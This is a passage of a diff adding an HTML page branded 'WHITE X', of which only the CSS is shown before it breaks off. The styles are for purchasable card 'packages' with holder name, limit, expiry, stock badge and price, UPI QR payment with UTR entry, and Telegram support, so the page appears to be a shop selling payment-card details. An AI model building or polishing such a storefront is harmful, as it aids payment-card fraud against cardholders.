@@ -1,0 +1,3483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>WHITE X | Premium Fintech Platform</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html {
+            font-size: 16px;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            background: #050505;
+            font-family: 'Inter', 'Space Grotesk', sans-serif;
+            color: #eef5ff;
+            overflow-x: hidden;
+            min-height: 100vh;
+            min-height: 100dvh;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #0a0a15;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #00ffff66;
+            border-radius: 10px;
+        }
+
+        .login-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            min-height: 100dvh;
+            padding: 1rem;
+            background: radial-gradient(circle at 20% 30%, #0a0a15, #000000);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-container::before {
+            content: '';
+            position: absolute;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(0, 255, 255, 0.05), transparent 70%);
+            top: -200px;
+            right: -200px;
+            animation: floatBg 8s ease-in-out infinite;
+        }
+
+        .login-container::after {
+            content: '';
+            position: absolute;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(191, 74, 255, 0.04), transparent 70%);
+            bottom: -100px;
+            left: -100px;
+            animation: floatBg 10s ease-in-out infinite reverse;
+        }
+
+        @keyframes floatBg {
+            0%,
+            100% {
+                transform: translate(0, 0) scale(1);
+            }
+            50% {
+                transform: translate(30px, -30px) scale(1.1);
+            }
+        }
+
+        .login-card {
+            max-width: 420px;
+            width: 100%;
+            background: rgba(12, 12, 20, 0.8);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-radius: 2rem;
+            border: 1px solid rgba(0, 255, 255, 0.15);
+            box-shadow: 0 30px 60px -20px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(0, 255, 255, 0.05) inset, 0 0 40px rgba(0, 255, 255, 0.05);
+            padding: 2.5rem 2rem 2rem;
+            transition: all 0.4s ease;
+            position: relative;
+            z-index: 2;
+        }
+
+        .login-card:hover {
+            border-color: rgba(0, 255, 255, 0.3);
+            box-shadow: 0 40px 70px -20px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(0, 255, 255, 0.1) inset, 0 0 60px rgba(0, 255, 255, 0.08);
+        }
+
+        .login-header {
+            text-align: center;
+            margin-bottom: 1.8rem;
+        }
+
+        .login-header .neon-logo {
+            font-size: 2.5rem;
+            cursor: pointer;
+            user-select: none;
+            display: inline-block;
+            transition: transform 0.3s ease;
+        }
+
+        .login-header .neon-logo:hover {
+            transform: scale(1.05);
+        }
+
+        .login-subtitle {
+            font-size: 0.85rem;
+            color: #8899aa;
+            font-weight: 400;
+            margin-top: 0.2rem;
+        }
+
+        .enter-btn {
+            background: linear-gradient(95deg, #00ccff, #bf4aff);
+            border: none;
+            padding: 1rem 1.5rem;
+            border-radius: 1.2rem;
+            font-weight: 700;
+            font-size: 1.1rem;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 20px rgba(0, 204, 255, 0.25);
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            letter-spacing: 0.5px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .enter-btn:active {
+            transform: scale(0.97);
+        }
+
+        .enter-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 204, 255, 0.4), 0 0 20px #bf4aff40;
+            background: linear-gradient(95deg, #00ddff, #d15eff);
+        }
+
+        .enter-btn i {
+            font-size: 1.2rem;
+        }
+
+        .login-features {
+            display: flex;
+            justify-content: center;
+            gap: 1.2rem;
+            margin-top: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .login-features span {
+            font-size: 0.6rem;
+            color: #667;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .login-features span i {
+            color: #00ffaa;
+            font-size: 0.55rem;
+        }
+
+        .card-vault {
+            position: relative;
+            width: 100%;
+            height: 200px;
+            margin: 1rem 0 1.5rem;
+            perspective: 1000px;
+        }
+
+        .card-vault-inner {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            transform-style: preserve-3d;
+            animation: vaultRotate 12s ease-in-out infinite;
+        }
+
+        @keyframes vaultRotate {
+            0%,
+            100% {
+                transform: rotateY(0deg) rotateX(0deg);
+            }
+            25% {
+                transform: rotateY(5deg) rotateX(-3deg);
+            }
+            50% {
+                transform: rotateY(-5deg) rotateX(3deg);
+            }
+            75% {
+                transform: rotateY(3deg) rotateX(-2deg);
+            }
+        }
+
+        .vault-card {
+            position: absolute;
+            width: 200px;
+            height: 130px;
+            border-radius: 1.2rem;
+            background: linear-gradient(145deg, #1a1a2e, #0f0f1a);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 255, 0.05) inset;
+            padding: 1rem;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            transition: all 0.3s ease;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .vault-card .card-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+        }
+
+        .vault-card .card-top .network-icon {
+            font-size: 0.7rem;
+            font-weight: 700;
+            color: #fff;
+            letter-spacing: 1px;
+        }
+
+        .vault-card .card-top .chip {
+            width: 28px;
+            height: 20px;
+            background: linear-gradient(135deg, #e6b800, #ffd966);
+            border-radius: 4px;
+        }
+
+        .vault-card .card-number {
+            font-size: 0.8rem;
+            letter-spacing: 2px;
+            color: #ccd;
+            font-weight: 500;
+            margin: 4px 0;
+        }
+
+        .vault-card .card-bottom {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.5rem;
+            color: #8899aa;
+        }
+
+        .vault-card-1 {
+            transform: translateX(-50%) translateZ(20px) rotateY(-3deg) translateY(-10px);
+            border-color: rgba(0, 255, 255, 0.3);
+            z-index: 3;
+            animation: cardFloat1 4s ease-in-out infinite;
+        }
+
+        .vault-card-2 {
+            transform: translateX(-50%) translateZ(0px) rotateY(0deg) translateY(10px);
+            border-color: rgba(191, 74, 255, 0.3);
+            z-index: 2;
+            animation: cardFloat2 4s ease-in-out infinite 0.5s;
+        }
+
+        .vault-card-3 {
+            transform: translateX(-50%) translateZ(-20px) rotateY(3deg) translateY(30px);
+            border-color: rgba(255, 170, 51, 0.3);
+            z-index: 1;
+            animation: cardFloat3 4s ease-in-out infinite 1s;
+        }
+
+        @keyframes cardFloat1 {
+            0%,
+            100% {
+                transform: translateX(-50%) translateZ(20px) rotateY(-3deg) translateY(-10px);
+            }
+            50% {
+                transform: translateX(-50%) translateZ(25px) rotateY(-5deg) translateY(-15px);
+            }
+        }
+
+        @keyframes cardFloat2 {
+            0%,
+            100% {
+                transform: translateX(-50%) translateZ(0px) rotateY(0deg) translateY(10px);
+            }
+            50% {
+                transform: translateX(-50%) translateZ(5px) rotateY(2deg) translateY(6px);
+            }
+        }
+
+        @keyframes cardFloat3 {
+            0%,
+            100% {
+                transform: translateX(-50%) translateZ(-20px) rotateY(3deg) translateY(30px);
+            }
+            50% {
+                transform: translateX(-50%) translateZ(-15px) rotateY(5deg) translateY(26px);
+            }
+        }
+
+        .vault-card .card-glow {
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(0, 255, 255, 0.05), transparent 60%);
+            pointer-events: none;
+        }
+
+        .glass-card {
+            background: rgba(12, 12, 20, 0.7);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            border-radius: 1.5rem;
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            box-shadow: 0 20px 35px -15px rgba(0, 0, 0, 0.5), 0 0 12px rgba(0, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary {
+            background: linear-gradient(95deg, #00ccff, #bf4aff);
+            border: none;
+            padding: 0.7rem 1.5rem;
+            border-radius: 2rem;
+            font-weight: 700;
+            font-size: 0.9rem;
+            color: white;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 0 8px #00ffff77;
+            width: fit-content;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            position: relative;
+            overflow: hidden;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        .btn-primary:active {
+            transform: scale(0.96);
+        }
+
+        .btn-primary:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 22px #bf4aff, 0 0 12px cyan;
+        }
+
+        .btn-danger {
+            background: linear-gradient(95deg, #ff3366, #cc0044);
+            border: none;
+            padding: 0.7rem 1.5rem;
+            border-radius: 2rem;
+            font-weight: 700;
+            font-size: 0.9rem;
+            color: white;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 0 8px #ff336677;
+            width: fit-content;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            position: relative;
+            overflow: hidden;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        .btn-danger:active {
+            transform: scale(0.96);
+        }
+
+        .btn-danger:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 22px #ff3366, 0 0 12px #ff0044;
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 1.5px solid #00ffff;
+            border-radius: 2rem;
+            padding: 0.5rem 1.2rem;
+            font-weight: 600;
+            font-size: 0.85rem;
+            color: cyan;
+            cursor: pointer;
+            transition: 0.2s;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        .btn-outline:active {
+            transform: scale(0.96);
+        }
+
+        .btn-outline:hover {
+            background: #00ffff22;
+            box-shadow: 0 0 10px cyan;
+        }
+
+        .btn-success {
+            background: linear-gradient(95deg, #00cc88, #00aa66);
+            border: none;
+            padding: 0.7rem 1.5rem;
+            border-radius: 2rem;
+            font-weight: 700;
+            font-size: 0.9rem;
+            color: white;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 0 8px #00cc8866;
+            width: fit-content;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        .btn-success:active {
+            transform: scale(0.96);
+        }
+
+        .btn-success:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 22px #00cc88, 0 0 12px #00ffaa;
+        }
+
+        .btn-cancel {
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 2rem;
+            padding: 0.7rem 1.5rem;
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: #8899aa;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            width: fit-content;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        .btn-cancel:active {
+            transform: scale(0.96);
+        }
+
+        .btn-cancel:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.3);
+            color: #fff;
+        }
+
+        .back-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            border-radius: 2rem;
+            padding: 0.4rem 1.2rem;
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: #88ccff;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+            text-decoration: none;
+            margin-bottom: 1rem;
+        }
+
+        .back-btn i {
+            font-size: 0.8rem;
+            color: cyan;
+        }
+
+        .back-btn:hover {
+            background: rgba(0, 255, 255, 0.1);
+            border-color: cyan;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.1);
+            transform: translateX(-3px);
+        }
+
+        .back-btn:active {
+            transform: scale(0.96);
+        }
+
+        .back-btn-wrapper {
+            display: flex;
+            align-items: center;
+            width: 100%;
+        }
+
+        @keyframes btnGlowPulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(0, 255, 255, 0.8), 0 0 0 0 rgba(191, 74, 255, 0.8);
+                transform: scale(1);
+            }
+            30% {
+                box-shadow: 0 0 0 18px rgba(0, 255, 255, 0.4), 0 0 0 12px rgba(191, 74, 255, 0.4);
+                transform: scale(1.02);
+            }
+            100% {
+                box-shadow: 0 0 0 30px rgba(0, 255, 255, 0), 0 0 0 25px rgba(191, 74, 255, 0);
+                transform: scale(1);
+            }
+        }
+
+        .btn-primary.pulse-glow {
+            animation: btnGlowPulse 0.8s ease-out forwards;
+        }
+
+        .btn-primary .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background-color: rgba(255, 255, 255, 0.7);
+            transform: scale(0);
+            animation: rippleAnim 0.6s linear forwards;
+            pointer-events: none;
+        }
+
+        @keyframes rippleAnim {
+            to {
+                transform: scale(8);
+                opacity: 0;
+            }
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(5, 5, 5, 0.94);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            opacity: 0;
+            transition: opacity 0.4s ease;
+            pointer-events: none;
+        }
+
+        .loading-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .loading-card {
+            background: rgba(12, 12, 25, 0.9);
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border-radius: 1.5rem;
+            padding: 1.8rem 2rem;
+            text-align: center;
+            border: 1px solid rgba(0, 255, 255, 0.5);
+            box-shadow: 0 0 50px rgba(0, 255, 255, 0.2);
+            animation: floatGlow 2s infinite ease-in-out;
+            max-width: 340px;
+            width: 85%;
+        }
+
+        @keyframes floatGlow {
+            0% {
+                transform: translateY(0px);
+                box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
+            }
+            50% {
+                transform: translateY(-6px);
+                box-shadow: 0 0 55px rgba(0, 255, 255, 0.5), 0 0 25px #bf4aff;
+            }
+            100% {
+                transform: translateY(0px);
+                box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
+            }
+        }
+
+        .spinner-neon {
+            width: 50px;
+            height: 50px;
+            margin: 0 auto 1rem;
+            border: 3px solid rgba(0, 255, 255, 0.2);
+            border-top: 3px solid cyan;
+            border-right: 3px solid #bf4aff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            box-shadow: 0 0 8px cyan;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            font-size: 1.1rem;
+            font-weight: 600;
+            background: linear-gradient(135deg, #fff, cyan, #bf4aff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 0.3rem;
+        }
+
+        .loading-sub {
+            font-size: 0.7rem;
+            color: #aaa;
+            letter-spacing: 1px;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0.8rem 1.5rem;
+            background: rgba(5, 5, 5, 0.75);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(0, 255, 255, 0.2);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .navbar .neon-logo {
+            font-size: 1.4rem;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 0.8rem;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .nav-links a {
+            color: #ddd;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.8rem;
+            cursor: pointer;
+            transition: 0.2s;
+            padding: 0.3rem 0.5rem;
+        }
+
+        .nav-links a:hover {
+            color: cyan;
+            text-shadow: 0 0 5px cyan;
+        }
+
+        .nav-links .btn-outline {
+            font-size: 0.7rem;
+            padding: 0.3rem 0.8rem;
+        }
+
+        .hero {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            gap: 1.5rem;
+            padding: 1.5rem 1.5rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .hero-left {
+            flex: 1.2;
+            min-width: 240px;
+        }
+
+        .hero-right {
+            flex: 1;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 320px;
+        }
+
+        .hero-left .neon-logo {
+            font-size: 2.2rem;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .hero-left h1 {
+            font-size: 1.5rem;
+            line-height: 1.3;
+        }
+
+        .hero-left p {
+            font-size: 0.85rem;
+            margin: 0.8rem 0;
+        }
+
+        .glow-rings {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+        }
+
+        .ring {
+            position: absolute;
+            border-radius: 50%;
+            background: radial-gradient(circle, rgba(0, 255, 255, 0.2), transparent);
+            filter: blur(25px);
+            animation: pulseRing 6s infinite ease-in-out;
+        }
+
+        .ring-1 {
+            width: 200px;
+            height: 200px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(0, 255, 255, 0.25), transparent);
+            animation-delay: 0s;
+        }
+        .ring-2 {
+            width: 260px;
+            height: 260px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(191, 74, 255, 0.2), transparent);
+            animation-delay: 2s;
+        }
+        .ring-3 {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: radial-gradient(circle, rgba(0, 255, 255, 0.2), transparent);
+            animation-delay: 4s;
+        }
+
+        @keyframes pulseRing {
+            0% {
+                opacity: 0.3;
+                transform: translate(-50%, -50%) scale(0.9);
+            }
+            50% {
+                opacity: 0.8;
+                transform: translate(-50%, -50%) scale(1.1);
+            }
+            100% {
+                opacity: 0.3;
+                transform: translate(-50%, -50%) scale(0.9);
+            }
+        }
+
+        .feature-row {
+            display: flex;
+            gap: 0.6rem;
+            margin-top: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .feature-chip {
+            background: rgba(0, 255, 255, 0.08);
+            border-radius: 2rem;
+            padding: 0.3rem 0.7rem;
+            border: 1px solid cyan;
+            font-size: 0.7rem;
+        }
+
+        .packages-section {
+            padding: 1.5rem 1.5rem 3rem;
+            background: radial-gradient(circle at 30% 10%, #0a0a18, #000);
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 1.6rem;
+            margin-bottom: 0.3rem;
+        }
+
+        .section-subtitle {
+            text-align: center;
+            font-size: 0.8rem;
+            color: #8899aa;
+            margin-bottom: 1rem;
+        }
+
+        .tabs {
+            display: flex;
+            justify-content: center;
+            gap: 0.6rem;
+            margin: 1rem 0 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            background: rgba(20, 20, 40, 0.8);
+            border: 1px solid #2c2c44;
+            border-radius: 2.5rem;
+            padding: 0.5rem 1.2rem;
+            font-weight: 600;
+            font-size: 0.75rem;
+            cursor: pointer;
+            color: #ccc;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+        }
+
+        .tab-btn img {
+            width: 26px;
+            height: 18px;
+            object-fit: contain;
+            border-radius: 4px;
+        }
+
+        .tab-btn.active {
+            background: linear-gradient(135deg, #00ffff22, #bf4aff22);
+            border-color: cyan;
+            color: cyan;
+            box-shadow: 0 0 12px cyan;
+            transform: scale(1.04);
+        }
+
+        .tab-btn:active {
+            transform: scale(0.95);
+        }
+
+        .plan-count-badge {
+            background: rgba(0, 255, 255, 0.15);
+            border-radius: 30px;
+            padding: 0.1rem 0.5rem;
+            font-size: 0.55rem;
+            color: #88ffff;
+            margin-left: 4px;
+        }
+
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 1.2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .package-card {
+            background: rgba(10, 10, 18, 0.85);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border-radius: 1.2rem;
+            padding: 1.2rem;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .package-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 20%, rgba(0, 255, 255, 0.03), transparent 60%);
+            pointer-events: none;
+        }
+
+        .package-card:hover {
+            transform: translateY(-4px);
+            border-color: rgba(0, 255, 255, 0.5);
+            box-shadow: 0 15px 30px -12px rgba(0, 255, 255, 0.2);
+        }
+
+        .package-card .card-type-display {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 0.3rem 0 0.6rem;
+            padding: 0.4rem;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .package-card .card-type-display img {
+            width: 44px;
+            height: 28px;
+            object-fit: contain;
+            border-radius: 6px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+        }
+
+        .package-card .card-type-display .network-name {
+            font-weight: 700;
+            font-size: 1rem;
+            letter-spacing: 0.5px;
+            background: linear-gradient(135deg, #fff, #aaccff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .package-card .feature-icons {
+            display: flex;
+            gap: 8px;
+            margin: 8px 0 10px;
+            flex-wrap: wrap;
+        }
+
+        .package-card .feature-icons .ficon {
+            display: flex;
+            align-items: center;
+            gap: 3px;
+            font-size: 0.55rem;
+            color: #99aabb;
+            background: rgba(255, 255, 255, 0.04);
+            padding: 2px 8px;
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .package-card .feature-icons .ficon i {
+            color: cyan;
+            font-size: 0.6rem;
+        }
+
+        .badge-stock {
+            background: #00aa5522;
+            border: 1px solid #00ffaa;
+            color: #00ffaa;
+            border-radius: 30px;
+            padding: 0.15rem 0.6rem;
+            font-size: 0.6rem;
+        }
+
+        .package-card .limit-expiry-row {
+            display: flex;
+            gap: 10px;
+            margin: 10px 0 14px;
+        }
+
+        .package-card .info-card-box {
+            flex: 1;
+            background: rgba(6, 6, 14, 0.85);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            border-radius: 10px;
+            padding: 8px 6px;
+            transition: all 0.2s;
+            backdrop-filter: blur(2px);
+            -webkit-backdrop-filter: blur(2px);
+            text-align: center;
+        }
+
+        .package-card .info-card-box .meta-label {
+            font-size: 0.6rem;
+            font-weight: 500;
+            letter-spacing: 0.6px;
+            color: #a0b3d9;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+
+        .package-card .info-card-box .meta-value {
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: #ffffff;
+            line-height: 1.3;
+            letter-spacing: 0.2px;
+        }
+
+        .package-card .price-tag {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: cyan;
+        }
+
+        .package-card .btn-primary {
+            width: 100%;
+            justify-content: center;
+            margin-top: 0.8rem;
+            font-size: 0.85rem;
+            padding: 0.6rem;
+        }
+
+        .card-holder-name {
+            font-size: 0.7rem;
+            color: #88aacc;
+            margin: 2px 0 4px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+        .card-holder-name i {
+            color: #00ffaa;
+            margin-right: 4px;
+            font-size: 0.6rem;
+        }
+
+        .support-section {
+            padding: 2.5rem 1.5rem;
+            text-align: center;
+        }
+
+        .support-grid {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 1.2rem;
+            margin-top: 1.5rem;
+        }
+
+        .support-card {
+            background: rgba(12, 12, 22, 0.7);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border-radius: 1.2rem;
+            padding: 1.2rem;
+            width: 200px;
+            cursor: pointer;
+            transition: 0.2s;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .support-card i {
+            font-size: 2rem;
+            color: #0088cc;
+        }
+
+        .support-card h3 {
+            font-size: 0.85rem;
+            margin: 0.5rem 0 0.2rem;
+            color: #fff;
+        }
+
+        .support-card p {
+            font-size: 0.7rem;
+            color: #8899aa;
+        }
+
+        .support-card .telegram-username {
+            color: #0088cc;
+            font-weight: 600;
+            font-size: 0.8rem;
+            margin-top: 4px;
+        }
+
+        .support-card:hover {
+            transform: translateY(-4px);
+            border-color: #0088cc;
+            box-shadow: 0 0 30px rgba(0, 136, 204, 0.15);
+        }
+
+        .support-card:active {
+            transform: scale(0.97);
+        }
+
+        .support-card .telegram-btn {
+            display: inline-block;
+            margin-top: 8px;
+            padding: 0.4rem 1.2rem;
+            background: rgba(0, 136, 204, 0.2);
+            border: 1px solid #0088cc;
+            border-radius: 2rem;
+            color: #0088cc;
+            font-size: 0.7rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            text-decoration: none;
+        }
+
+        .support-card .telegram-btn:hover {
+            background: rgba(0, 136, 204, 0.4);
+            box-shadow: 0 0 20px rgba(0, 136, 204, 0.2);
+        }
+
+        footer {
+            border-top: 1px solid rgba(0, 255, 255, 0.2);
+            padding: 1.5rem 1.5rem;
+            text-align: center;
+            background: #010105;
+        }
+
+        footer .neon-logo {
+            font-size: 1.2rem;
+        }
+
+        footer p {
+            font-size: 0.7rem;
+            color: #778899;
+            margin-top: 0.5rem;
+        }
+
+        .qr-container,
+        .utr-container,
+        .fail-container {
+            max-width: 500px;
+            margin: 1.5rem auto;
+            padding: 1.5rem;
+        }
+
+        .qr-canvas-wrapper {
+            display: flex;
+            justify-content: center;
+            margin: 1rem 0;
+            position: relative;
+        }
+
+        canvas.qr-canvas {
+            width: 240px;
+            height: 240px;
+            background: white;
+            border-radius: 20px;
+            padding: 12px;
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.25), 0 0 60px rgba(0, 255, 255, 0.05);
+            transition: all 0.3s ease;
+        }
+
+        canvas.qr-canvas:hover {
+            box-shadow: 0 0 50px rgba(0, 255, 255, 0.35), 0 0 80px rgba(0, 255, 255, 0.08);
+            transform: scale(1.02);
+        }
+
+        .qr-placeholder {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 240px;
+            height: 240px;
+            background: #0a0a18;
+            border-radius: 20px;
+            border: 2px dashed #00ffff44;
+            color: #00ffff88;
+            font-size: 0.8rem;
+            text-align: center;
+            padding: 1rem;
+        }
+
+        .qr-placeholder i {
+            font-size: 3rem;
+            margin-bottom: 0.5rem;
+            color: cyan;
+        }
+
+        .qr-placeholder .upi-id {
+            color: #88ccff;
+            font-weight: 600;
+            font-size: 0.7rem;
+            margin-top: 4px;
+            word-break: break-all;
+        }
+
+        /* QR Download Button */
+        .qr-download-btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            background: linear-gradient(95deg, #00cc88, #00aa66);
+            border: none;
+            padding: 0.7rem 2rem;
+            border-radius: 2rem;
+            font-weight: 700;
+            font-size: 0.85rem;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 15px rgba(0, 204, 136, 0.3);
+            margin-top: 0.8rem;
+            width: fit-content;
+        }
+
+        .qr-download-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(0, 204, 136, 0.5);
+        }
+
+        .qr-download-btn:active {
+            transform: scale(0.95);
+        }
+
+        .qr-download-btn i {
+            font-size: 1rem;
+        }
+
+        .qr-download-wrapper {
+            text-align: center;
+            margin-top: 0.5rem;
+        }
+
+        .page-with-back {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 1rem 1rem 2rem;
+        }
+
+        .utr-input {
+            letter-spacing: 3px;
+            font-size: 1.2rem !important;
+            text-align: center;
+            font-weight: 700;
+            font-family: 'Space Grotesk', monospace;
+        }
+
+        .utr-input::placeholder {
+            letter-spacing: 1px;
+            font-weight: 400;
+            font-size: 0.9rem;
+        }
+
+        .utr-error {
+            color: #ff6b8b;
+            font-size: 0.7rem;
+            margin-top: 4px;
+            display: none;
+        }
+
+        .utr-error.show {
+            display: block;
+        }
+
+        .utr-char-count {
+            text-align: right;
+            font-size: 0.6rem;
+            color: #667;
+            margin-top: 2px;
+            font-weight: 600;
+        }
+
+        .utr-char-count.valid {
+            color: #00ff88;
+        }
+
+        .fail-popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
